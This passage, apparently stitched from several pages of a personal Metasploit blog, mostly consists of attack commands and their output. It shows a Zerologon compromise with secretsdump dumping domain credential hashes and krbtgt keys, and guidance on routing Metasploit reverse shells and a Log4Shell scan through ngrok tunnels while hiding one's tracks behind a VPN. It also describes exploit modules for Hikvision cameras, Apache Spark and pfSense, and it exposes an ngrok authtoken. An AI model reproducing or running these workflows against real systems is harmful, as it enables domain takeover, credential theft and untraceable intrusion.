┌──(root💀coolhostname)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py administrator@192.168.201.9 -hashes aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f -outputfile victim.com -user-status
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x783810db95179311387fe51e47d7f905
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
VICTIM\ADVICTIM2012R2$:aes256-cts-hmac-sha1-96:9e247f9d42ae831376814de454b2108f81b39e395f43583ea12ee9271de260cf
VICTIM\ADVICTIM2012R2$:aes128-cts-hmac-sha1-96:06ebbd16a649970d8d4bbc819169fad8
VICTIM\ADVICTIM2012R2$:des-cbc-md5:51fe8f7f494c8c75
VICTIM\ADVICTIM2012R2$:plain_password_hex:cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38
VICTIM\ADVICTIM2012R2$:aad3b435b51404eeaad3b435b51404ee:6584bf06e7b65c680426dd1b21352f01:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xa1da827ba8bbfc007be32a602273cf084e4ecf9c
dpapi_userkey:0x2d9f40a47e6ca30622ee5a2ff26cb03c279d7611
[*] NL$KM
 0000   51 AB 90 B9 93 2B 63 98  71 C6 9E 2F BF BB 8E 1F   Q....+c.q../....
 0010   F0 55 F0 1C EF B9 3C 62  C4 7E B8 CE BB 86 B7 DB   .U....<b.~......
 0020   65 F5 AA 34 C5 57 67 F3  CF A6 02 B0 BE F9 B4 24   e..4.Wg........$
 0030   E1 87 49 70 2B 8F 82 D7  A9 B2 71 D7 21 DC 27 E5   ..Ip+.....q.!.'.
NL$KM:51ab90b9932b639871c69e2fbfbb8e1ff055f01cefb93c62c47eb8cebb86b7db65f5aa34c55767f3cfa602b0bef9b424e18749702b8f82d7a9b271d721dc27e5
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Disabled)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)
ADVICTIM2012R2$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Enabled)
CAVICTIM2012R2$:1103:aad3b435b51404eeaad3b435b51404ee:9c1ffa33539e567196cfbaa923326d3a::: (status=Enabled)
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:484daca6d51e63a5332b6ce83e9d24389f9f95219118efc01dd69c4bee1a032e
krbtgt:aes128-cts-hmac-sha1-96:dbbdcef9cacf1c3509e47fef1b373634
krbtgt:des-cbc-md5:bfe0453e54585b43
ADVICTIM2012R2$:aes256-cts-hmac-sha1-96:6c4942b6eb4f1110745b39a50f77952c0e398235ed27f9c333b9753f801edd27
ADVICTIM2012R2$:aes128-cts-hmac-sha1-96:401d7736faf7f88f22667c3d32c08bee
ADVICTIM2012R2$:des-cbc-md5:89cb6876a4c84616
AVICTIM2012R2$:aes256-cts-hmac-sha1-96:23c6b2e38221f5d84be025657a295a6026007e4c7a948f691f65ecf826750452
CAVICTIM2012R2$:aes128-cts-hmac-sha1-96:c96ad9db438b318dcf0168d4b2d2d86c
CAVICTIM2012R2$:des-cbc-md5:a79badf7ec9eb0cd
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```
Now restore the machine account password with the zerologon Metasploit module by setting the action to restore.
```shell
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set action RESTORE
action => RESTORE
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set PASSWORD cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38
PASSWORD => cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > options

Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):

   Name      Current Setting                          Required  Description
   ----      ---------------                          --------  -----------
   NBNAME    advictim2012r2                           yes       The server's NetBIOS name
   PASSWORD  cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2  no        The password to restore for the machine account (in hex)
             e79a65c30e0ac776a3a412c38
   RHOSTS    192.168.201.9                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
                                                                iki/Using-Metasploit
   RPORT                                              no        The netlogon RPC port (TCP)


Auxiliary action:

   Name     Description
   ----     -----------
   RESTORE  Restore the machine account password

msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > exploit
[*] Running module against 192.168.201.9

[*] 192.168.201.9: - Connecting to the endpoint mapper service...
[*] 192.168.201.9:49155 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[*] 192.168.201.9:49155 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[+] 192.168.201.9:49155 - Successfully set machine account (advictim2012r2$) password
[*] Auxiliary module execution completed
```

Job done !!!\
Machine account password restored and we grabbed all the password hashes including the Golden ticket that gives us the full domain administrator access for further exploitation.

### In summary
This again is a very easy route to comprise and gain full admin access on an Active Directory domain.\
\
Microsoft has applied two fixes to mitigate this attack.\
\
The first mitigation is to reject NetrServerAuthenticate3 requests in which the first five bytes are identical. 
However, this still allows for longer brute-force attacks (requiring an average of 2^32 attempts).\
\
The second mitigation is to reject Netlogon channels that are not signed/sealed for all Windows computer accounts.
This will completely mitigate the attack even if brute force is possible.\
\
Since, Windows Netlogon clients always seal Netlogon messages there shouldn’t be any problem.
But, Microsoft took the conservative approach and still allowed unsigned Netlogon sessions for non-Windows computer accounts.
This means that, in theory, non-Windows computer accounts are still vulnerable. 
However in the meanwhile, Microsoft has released a patch that will also reject insecure Netlogon sessions from non-Windows devices.

<!-- END LEGACY SOURCE: _pages/ad-domain-attack.md -->

---

## _pages/tips-and-tricks.md

**Title:** <span style="color:lime">Metasploit Tips and Tricks</span>

**Legacy permalink:** `/tips-and-tricks/`

<!-- BEGIN LEGACY SOURCE: _pages/tips-and-tricks.md -->

---
title: <span style="color:lime">Metasploit Tips and Tricks</span>
permalink: /tips-and-tricks/
author_profile: false
categories:
  - Metasploit
  - Tips
  - Tricks
tags:
  - ngrok
  - exploits
  - WAN
  - MSF
sidebar:
  - title: ""
    image: /assets/images/metasploit.png
toc: true
toc_label: "Table of Contents"
toc_icon: "folder"
toc_sticky: true
---

## Introduction

Metasploit is the swiss army knive for hackers and it has tons of exploits that can be used in any engagement.
It comes in two versions, Open Source and Commercial, but our focus will be on the Open Source version called Metasploit Framework (MSF). 
The following sections do assume that the reader has a basic understanding how MSF works and that you have installed it on
your machine. In my case I am running Kali Linux on a Raspberry PI with MSF installed.

Check out the references below if you still need to install and understand Metasploit a bit better. 

[Metasploit Framework Tutorial](https://nooblinux.com/metasploit-tutorial/ "Metasploit Framework Tutorial")

[Metasploit Basics](https://null-byte.wonderhowto.com/how-to/metasploit-basics/ "Metasploit Basics")

## Tips and Tricks: Use MSF across the WAN
Doing a pentest or exploring exploits in the Wild requires a specific configuration in order for Metasploit exploits to work.
First of all your attacker machine should be reachable on a public IP address and specific ports should be open for the exploit to work.
And of course, you want to hide your tracks so that your attacker machine can not be traced back to you as owner.

Let's first tackle the public IP. Typically when you are behind a router/firewall at home with your service provider, you will get a public ip.
On Kali Linux, you can get this by running the command `curl ident.me`.

```shell
# curl ident.me
33.34.35.36┌──(root💀coolhostname)-[~]
```
This is your public IP assigned by your provider and it typically varies unless you have asked for a fixed public IP address.
Using this public IP address is not very helpfull in covering your tracks, so you typically want sign-up for a Virtual Private Network (VPN).
There are plenty of options such as NordVPN,  PureVPN, ExpressVPN, etc... where you can get a professional VPN service. 
Using VPN will provide you a public IP anywhere in the world that will hide your IP.

I am using ExpressVPN because it has a good world wide coverage and it uses OpenVPN profiles, which make it handy to use on Kali Linux or any other Linux distro.

So this is step one for your hiding your IP, but we still need to crack your network port openings for Metasploit to work across the WAN. 
There are several options to do this such as port forwarding either directly on your firwall or in Metasploit, but I prefer to use ngrok tunnels.

Ngrok tunnels will allow you to tunnel traffic thru your firewall without opening any port, because the tunnel is initiated from your attacker machine to the outside world.
This is pretty cool because I would like to keep my firewall closed without any ports open.

How does it work? 

First sign up with [ngrok](https://ngrok.com/ "ngrok") here. There is free subscription that provides you some free tcp and http(s) tunnels.

Download, install ngrok and setup your ngrok yaml configuration file with a tcp and http(s) tunnel.

```shell
# unzip /root/ngrok.zip
# ngrok config add-authtoken 1su9qI65blhIGRTL3CwTsbKp5ml_3nH1bv5WA9HzfRhpmXTHJ
# nano ./ngrok2/ngrok.yml
```
ngrok.yml example:

```text
authtoken: 1su9qI65blhIGRTL3CwTsbKp5ml_3nH1bv5WA9HzfRhpmXTHJ
log: /var/log/ngrok.log

tunnels:
  tcp1970:
    proto: tcp
    addr: 0.0.0.0:1970

  http1981:
    proto: http
    addr: 0.0.0.0:1981
```
Fire up ngrok.

```shell
# ngrok start -all --region eu
ngrok by @inconshreveable                                                                 (Ctrl+C to quit)

Session Status                online
Account                       "your name" (Plan: free)
Version                       2.3.40
Region                        Europe (eu)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://6.tcp.eu.ngrok.io:14594 -> 0.0.0.0:1970
Forwarding                    http://64db913882c5.eu.ngrok.io -> http://0.0.0.0:1981
Forwarding                    https://64db913882c5.eu.ngrok.io -> http://0.0.0.0:1981

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```
Now let's use these tunnels in a Metasploit exploit setup.

In order for Metasploit to work with the ngrok tunnels, you need to specify the right parameters in Metasploit.
First of all you need to configure the `LHOST` and `LPORT` parameter which is your attacker machine. 

In a local NAT setup, you will configure your private IP and port here, but if you want to make it work across the WAN you need to configure the ngrok tunnel side that is accessible from the Internet.
In our case, using the command `set LHOST 6.tcp.eu.ngrok.io` and `set LPORT 14594`. 

However, do not forget to configure the other side of the ngrok tunnel in Metasploit to your local listener 0.0.0.0 that runs on port 1970.
This can be done by using the advanced option in MSF using the command `set ReverseListenerBindAddress 0.0.0.0` and `set ReverseListenerBindPort 1970`.

If you use an exploit with a http(s) stager using `SRVHOST` and `SRVPORT`, you need to do a similar configuration by applying the command `set SRVHOST 0.0.0.0` and `set SRVPORT 1981`.

Again with the advanced option, use the command `set URIHOST 64db913882c5.eu.ngrok.io` and `set URIPORT 80` to match the public accessible side of the ngrok http tunnel.

<span style="color:yellow"><i class="fa fa-info-circle"></i></span> please notice that `LHOST` and `LPORT` mapping to ngrok is opposite versus the `SRVHOST` and `SRVPORT` mapping.
{: .notice--info}

The example below shows the ngrok setup for one of the newer exploits in MSF.

```shell
msf6 exploit(linux/http/cisco_rv_series_authbypass_and_rce) > options

Module options (exploit/linux/http/cisco_rv_series_authbypass_and_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     <TARGET-IP>      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      443              yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0
                                         .0.0 to listen on all addresses.
   SRVPORT    1981             yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/armle/meterpreter/reverse_tcp):

   Name   Current Setting    Required  Description
   ----   ---------------    --------  -----------
   LHOST  6.tcp.eu.ngrok.io  yes       The listen address (an interface may be specified)
   LPORT  14594              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper

msf6 exploit(linux/http/cisco_rv_series_authbypass_and_rce) > advanced

Module advanced options (exploit/linux/http/cisco_rv_series_authbypass_and_rce):

   Name                    Current Setting                        Required  Description
   ----                    ---------------                        --------  -----------
   AllowNoCleanup          false                                  no        Allow exploitation without the possibility of cleaning up files
   AutoCheck               true                                   no        Run check before exploit
   CMDSTAGER::DECODER                                             no        The decoder stub to use.
   CMDSTAGER::FLAVOR       auto                                   no        The CMD Stager to use. (Accepted: auto, wget, curl)
   CMDSTAGER::SSL          false                                  no        Use SSL/TLS for supported stagers
   CMDSTAGER::TEMP                                                no        Writable directory for staged files
   ContextInformationFile                                         no        The information file that contains context information
   DOMAIN                  WORKSTATION                            yes       The domain to use for Windows authentication
   DigestAuthIIS           true                                   no        Conform to IIS, should work for most servers. Only set to false fo
                                                                            r non-IIS servers
   DisablePayloadHandler   false                                  no        Disable the handler code for the selected payload
   EXE::Custom                                                    no        Use custom exe instead of automatically generating a payload exe
   EXE::EICAR              false                                  no        Generate an EICAR file instead of regular payload exe
   EXE::FallBack           false                                  no        Use the default template in case the specified one is missing
   EXE::Inject             false                                  no        Set to preserve the original EXE function
   EXE::OldMethod          false                                  no        Set to use the substitution EXE generation method.
   EXE::Path                                                      no        The directory in which to look for the executable template
   EXE::Template                                                  no        The executable template file name.
   EnableContextEncoding   false                                  no        Use transient context when encoding payloads
   FileDropperDelay                                               no        Delay in seconds before attempting cleanup
   FingerprintCheck        true                                   no        Conduct a pre-exploit fingerprint verification
   ForceExploit            false                                  no        Override check result
   HttpClientTimeout                                              no        HTTP connection and receive timeout
   HttpPassword                                                   no        The HTTP password to specify for authentication
   HttpRawHeaders                                                 no        Path to ERB-templatized raw headers to append to existing headers
   HttpTrace               false                                  no        Show the raw HTTP requests and responses
   HttpTraceColors         red/blu                                no        HTTP request and response colors for HttpTrace (unset to disable)
   HttpTraceHeadersOnly    false                                  no        Show HTTP headers only in HttpTrace
   HttpUsername                                                   no        The HTTP username to specify for authentication
   ListenerBindAddress                                            no        The specific IP address to bind to if different from SRVHOST
   ListenerBindPort                                               no        The port to bind to if different from SRVPORT
   ListenerComm                                                   no        The specific communication channel to use for this service
   MSI::Custom                                                    no        Use custom msi instead of automatically generating a payload msi
   MSI::EICAR              false                                  no        Generate an EICAR file instead of regular payload msi
   MSI::Path                                                      no        The directory in which to look for the msi template
   MSI::Template                                                  no        The msi template file name
   MSI::UAC                false                                  no        Create an MSI with a UAC prompt (elevation to SYSTEM if accepted)
   SSLCipher                                                      no        String for SSL cipher spec - "DHE-RSA-AES256-SHA" or "ADH"
   SSLCompression          false                                  no        Enable SSL/TLS-level compression
   SSLVersion              Auto                                   yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are
                                                                             auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1,
                                                                            TLS1.2)
   SendRobots              false                                  no        Return a robots.txt file if asked for one
   URIHOST                 64db913882c5.eu.ngrok.io               no        Host to use in URI (useful for tunnels)
   URIPORT                 80                                     no        Port to use in URI (useful for tunnels)
   UserAgent               Mozilla/5.0 (Windows NT 10.0; Win64;   no        The User-Agent header to use for all requests
                           x64) AppleWebKit/537.36 (KHTML, like
                           Gecko) Chrome/98.0.4758.81 Safari/537
                           .36
   VERBOSE                 false                                  no        Enable detailed status messages
   WORKSPACE                                                      no        Specify the workspace for this module
   WfsDelay                5                                      no        Additional delay in seconds to wait for a session


Payload advanced options (linux/armle/meterpreter/reverse_tcp):

   Name                         Current Setting  Required  Description
   ----                         ---------------  --------  -----------
   AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
   AutoRunScript                                 no        A script to run automatically on session creation.
   AutoSystemInfo               true             yes       Automatically capture system information on initialization.
   AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
   AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
   EnableStageEncoding          false            no        Encode the second stage payload
   EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
   HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
   InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
   MeterpreterDebugBuild        false            no        Use a debug version of Meterpreter
   MeterpreterTryToFork         true             no        Fork a new process if the functionality is available
   PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
   PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
   PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
   PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
   PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
   PingbackRetries              0                yes       How many additional successful pingbacks
   PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks
   ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through pro
                                                           xy but directly to LHOST
   ReverseListenerBindAddress   0.0.0.0          no        The specific IP address to bind to on the local system
   ReverseListenerBindPort      1970             no        The port to bind to on the local system if different from LPORT
   ReverseListenerComm                           no        The specific communication channel to use for this listener
   ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
   SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
   SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
   SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
   SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
   StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
   StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is se
                                                           t
   StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
   StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
   StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
   VERBOSE                      false            no        Enable detailed status messages
   WORKSPACE                                     no        Specify the workspace for this module
```
With this setup, your able to run your exploit across the WAN using the tunnels without any need for port forwarding or port openings on your firewall.

The other good thing with his setup is that you are hiding your tracks, because these tunnels are generated with a different FQDN every time you restart ngrok. 

But there is still more to explain...

Recently (April 2022), the Rapid7 team added an additional advanced configuration option called `ListenerBindAddress` and `ListenerBindPort`.

This looks quite similar as the *Reverse* variant so why is it there?

Let's not get confused here. These two parameters are also linked to the `SRVHOST` and `SRVPORT` used in the previous example, but in a different context.
In some exploits, the need arises for a local server not being a http(s) stager.
A good example is the log4shell scanner where there is a requirement to have a local rogue LDAP server to pull off the log4j vulnerability. 

You can read more about log4j in my other article [log4shell](/log4shell/ "log4shell") 

Anyhow, the example below, hunting down a vulnerable log4j VMWare vcenter server, shows the use of these new parameters in combination with the ngrok tunnel to run a log4shell scan across the WAN.
Bear in mind, that you need to setup your tunnel with a mapping to your local LDAP server (see the tcp389 entry in the ngrok yaml config).

Happy hunting...

./ngrok2/ngrok.yml:
```text
authtoken: 1su9qI65blhIGRTL3CwTsbKp5ml_3nH1bv5WA9HzfRhpmXTHJ
log: /var/log/ngrok.log

tunnels:
  tcp1970:
    proto: tcp
    addr: 0.0.0.0:1970

  http1981:
    proto: http
    addr: 0.0.0.0:1981
  
 tcp389:
    proto: tcp
    addr: 0.0.0.0:389    
```

```shell
# ngrok start -all --region eu
ngrok by @inconshreveable                                                                 (Ctrl+C to quit)

Session Status                online
Account                       "your name" (Plan: free)
Version                       2.3.40
Region                        Europe (eu)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://4.tcp.eu.ngrok.io:13743 -> 0.0.0.0:389
Forwarding                    http://50b9e65376c4.eu.ngrok.io -> http://0.0.0.0:1981
Forwarding                    https://50b9e65376c4.eu.ngrok.io -> http://0.0.0.0:1981
Forwarding                    tcp://7.tcp.eu.ngrok.io:10560 -> 0.0.0.0:1970

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

```shell
msf6 auxiliary(scanner/http/log4shell_scanner) > set srvhost 4.tcp.eu.ngrok.io
srvhost => 4.tcp.eu.ngrok.io
msf6 auxiliary(scanner/http/log4shell_scanner) > set srvport 13743
srvport => 13743
msf6 auxiliary(scanner/http/log4shell_scanner) > set ListenerBindAddress 0.0.0.0
ListenerBindAddress => 0.0.0.0
msf6 auxiliary(scanner/http/log4shell_scanner) > set ListenerBindPort 389
ListenerBindPort => 389
msf6 auxiliary(scanner/http/log4shell_scanner) > set LEAK_PARAMS ${java:hw}^${env:PATH}
LEAK_PARAMS => ${java:hw}^${env:PATH}
msf6 auxiliary(scanner/http/log4shell_scanner) > options

Module options (auxiliary/scanner/http/log4shell_scanner):

   Name          Current Setting                           Required  Description
   ----          ---------------                           --------  -----------
   HEADERS_FILE  /root/http_headers.txt                    no        File containing headers to check
   HTTP_METHOD   GET                                       yes       The HTTP method to use
   LDAP_TIMEOUT  30                                        yes       Time in seconds to wait to receive LDAP connections
   LDIF_FILE                                               no        Directory LDIF file path
   LEAK_PARAMS    ${java:hw}^${env:PATH}                   no        Additional parameters to leak, separated by the ^ character (e.g., ${env
                                                                     :USER}^${env:PATH})
   Proxies                                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        192.168.1.1                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         443                                       yes       The target port (TCP)
   SRVHOST       4.tcp.eu.ngrok.io                         yes       The local host or network interface to listen on. This must be an address
                                                                     on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       13743                                     yes       The local port to listen on.
   SSL           true                                      no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /                                         yes       The URI to scan
   THREADS       1                                         yes       The number of concurrent threads (max one per host)
   URIS_FILE     /root/http_uris.txt                       no        File containing additional URIs to check
   VHOST                                                   no        HTTP server virtual host

msf6 auxiliary(scanner/http/log4shell_scanner) > advanced

Module advanced options (auxiliary/scanner/http/log4shell_scanner):

   Name                               Current Setting                    Required  Description
   ----                               ---------------                    --------  -----------
   AddClassPath                                                          no        Additional java classpath
   DOMAIN                             WORKSTATION                        yes       The domain to use for Windows authentication
   DigestAuthIIS                      true                               no        Conform to IIS, should work for most servers. Only set to
                                                                                   false for non-IIS servers
   FingerprintCheck                   true                               no        Conduct a pre-exploit fingerprint verification
   HttpClientTimeout                                                     no        HTTP connection and receive timeout
   HttpPassword                                                          no        The HTTP password to specify for authentication
   HttpRawHeaders                                                        no        Path to ERB-templatized raw headers to append to existing
                                                                                   headers
   HttpTrace                          false                              no        Show the raw HTTP requests and responses
   HttpTraceColors                    red/blu                            no        HTTP request and response colors for HttpTrace (unset to d
                                                                                   isable)
   HttpTraceHeadersOnly               false                              no        Show HTTP headers only in HttpTrace
   HttpUsername                                                          no        The HTTP username to specify for authentication
   JavaCache                          /root/.msf4/javacache              yes       Java cache location
   LDAP_AUTH_BYPASS                   true                               yes       Ignore LDAP client authentication
   LdapServerTcp                      true                               yes       Serve TCP LDAP requests
   LdapServerUdp                      true                               yes       Serve UDP LDAP requests
   ListenerBindAddress                0.0.0.0                            no        The specific IP address to bind to if different from SRVHO
                                                                                   ST
   ListenerBindPort                   389                                no        The port to bind to if different from SRVPORT
   ListenerComm                                                          no        The specific communication channel to use for this service
   Powershell::encode_final_payload   false                              yes       Encode final payload for -EncodedCommand
   Powershell::encode_inner_payload   false                              yes       Encode inner payload for -EncodedCommand
   Powershell::exec_in_place          false                              yes       Produce PSH without executable wrapper
   Powershell::exec_rc4               false                              yes       Encrypt PSH with RC4
   Powershell::method                 reflection                         yes       Payload delivery method (Accepted: net, reflection, old, m
                                                                                   sil)
   Powershell::no_equals              false                              yes       Pad base64 until no "=" remains
   Powershell::noninteractive         true                               yes       Execute powershell without interaction
   Powershell::persist                false                              yes       Run the payload in a loop
   Powershell::prepend_protections_b  auto                               yes       Prepend AMSI/SBL bypass (Accepted: auto, true, false)
   ypass
   Powershell::prepend_sleep                                             no        Prepend seconds of sleep
   Powershell::remove_comspec         false                              yes       Produce script calling powershell directly
   Powershell::strip_comments         true                               yes       Strip comments
   Powershell::strip_whitespace       false                              yes       Strip whitespace
   Powershell::sub_funcs              false                              yes       Substitute function names
   Powershell::sub_vars               true                               yes       Substitute variable names
   Powershell::wrap_double_quotes     true                               yes       Wraps the -Command argument in single quotes
   SSLVersion                         Auto                               yes       Specify the version of SSL/TLS to be used (Auto, TLS and S
                                                                                   SL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3
                                                                                   , TLS1, TLS1.1, TLS1.2)
   ShowProgress                       true                               yes       Display progress messages during a scan
   ShowProgressPercent                10                                 yes       The interval in percent that progress should be shown
   UserAgent                          Mozilla/5.0 (iPad; CPU OS 15_3_1   no        The User-Agent header to use for all requests
                                      like Mac OS X) AppleWebKit/605.1.
                                      15 (KHTML, like Gecko) Version/15
                                      .2 Mobile/15E148 Safari/604.1
   VERBOSE                            false                              no        Enable detailed status messages
   WORKSPACE                                                             no        Specify the workspace for this module

msf6 auxiliary(scanner/http/log4shell_scanner) > exploit

[+] 192.168.1.1:443     - Log4Shell found via /websso/SAML2/SSO/vsphere.local?SAMLRequest= (header: X-Forwarded-For) (os: Linux 4.19.191-1.ph3 unknown, architecture: amd64-64) (java: Azul Systems, Inc._1.8.0_291) 
(leaked: ${java:hw}=processors: 4, architecture: amd64-64  ${env:PATH}=/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/java/jre-vmware/bin:/opt/vmware/bin)
[*] Sleeping 30 seconds for any last LDAP connections
[*] Server stopped.
[*] Auxiliary module execution completed
```
     

## Tips and Tricks: Using SMB pipes in MSF

<!-- END LEGACY SOURCE: _pages/tips-and-tricks.md -->

---

## _pages/module-development.md

**Title:** <span style="color:lime">Metasploit Module Development</span>

**Legacy permalink:** `/module-development/`

<!-- BEGIN LEGACY SOURCE: _pages/module-development.md -->

---
title: <span style="color:lime">Metasploit Module Development</span>
permalink: /module-development/
author_profile: false
categories:
  - Metasploit
  - Development
  - Modules
tags:
  - exploits
  - Ruby
  - MSF
sidebar:
  - title: ""
    image: /assets/images/metasploit.png
toc: true
toc_label: "Table of Contents"
toc_icon: "folder"
toc_sticky: true
---

This page contains private developed Metasploit modules that can be reused freely.
Most of these modules are already added to the mainstream of Metasploit, but feel free to download them from [here](https://github.com/h00die-gr3y/Metasploit).

## Modules Installation
1. Copy the files with the rb extension to your local Metasploit module directory -> `~/.msf4/modules/...`
2. Restart Metasploit to see the module or reload the modules with command `reload_all`
3. See also [Running private modules](https://docs.metasploit.com/docs/using-metasploit/intermediate/running-private-modules.html)

## Module details

### hikvision_unauth_pwd_reset.rb
Unauthenticated password change for any user configured at a vulnerable Hikvision IP Camera.

Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account.
The vulnerability has been present in Hikvision products since 2014. 
In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names.
Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing (shodan search: `App-webs 200 OK product:"Hikvision IP Camera" port:"80"`). 

This module allows the attacker to perform an unauthenticated password change of any vulnerable Hikvision IP Camera to gaining full administrative access.
The vulnerability can be exploited for all configured users.

**Installation:**
```console
# cp hikvision_unauth_pwd_reset.rb ~/.msf4/modules/auxiliary/admin/http
# msfconsole
msf6> reload_all
```
**UPDATE September 30, 2022:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-178](https://www.rapid7.com/blog/post/2022/09/30/metasploit-weekly-wrap-up-178/)

### apache_spark_exec.rb
This module exploits an unauthenticated command injection vulnerability in Apache Spark.
Successful exploitation results in remote code execution under the context of the Spark application user.
The command injection occurs because Spark checks the group membership of the user passed in the ?doAs parameter by using a raw Linux command.
It is triggered by a non-default setting called `spark.acls.enable`.
This configuration setting `spark.acls.enable` should be set **true** in the Spark configuration to make the application vulnerable for this attack. 

Apache Spark versions `3.0.3` and earlier, versions `3.1.1` to `3.1.2`, and versions `3.2.0` to `3.2.1` are affected by this vulnerability.

**Installation:**
```console
# cp apache_spark_exec.rb ~/.msf4/modules/exploits/linux/http
# msfconsole
msf6> reload_all
```
**UPDATE September 13, 2022:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/apache_spark_rce_cve_2022_33891`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-175](https://www.rapid7.com/blog/post/2022/09/09/metasploit-weekly-wrap-up-175/)

### pfsense_pfblockerng_rce_cve_2022_31814.rb
unauthenticated Remote Command Execution as root in the pfSense pfBlockerNG plugin.

This module exploits an unauthenticated Remote Command Execution as root in the pfSense pfBlockerNG plugin [CVE-2022-31814](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31814).
The vulnerability affects versions of `pfBlockerNG <= 2.1.4_26` and can be exploited by an un authenticated user gaining root access.
pfBlockerNG is a pfSense plugin that is NOT installed by default and it’s generally used to block inbound connections from wholecountries or IP ranges.
This module uses the vulnerability to upload and execute payloads gaining root privileges.

**Installation:**
```console
